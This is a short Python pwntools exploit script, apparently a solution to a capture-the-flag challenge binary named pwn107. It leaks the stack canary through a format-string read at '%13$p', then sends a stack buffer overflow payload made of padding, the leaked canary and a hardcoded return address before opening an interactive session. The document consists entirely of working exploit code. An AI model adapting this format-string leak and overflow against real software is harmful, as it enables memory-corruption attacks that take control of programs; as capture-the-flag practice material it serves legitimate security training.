from pwn import *

# stack canary is at %13$p (determined by testing all values from 1-40, then retesting those that end in 00 to see how random they are)

p = process('./pwn107.pwn107')

print(p.clean().decode())
p.sendline(b'%13$p')
print(p.recvuntil(b'streak: ').decode())
canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'A'*24
payload += p64(canary)
payload += b'\x4c\x09\x40\x55\x55\x55\x00\x00'
# payload += b'A'*6 + b"\x00\x00" # assuming ret is right afterwards
# payload += ELF.sym["get_streak"]

print(p.clean().decode())
p.sendline(payload)
p.interactive()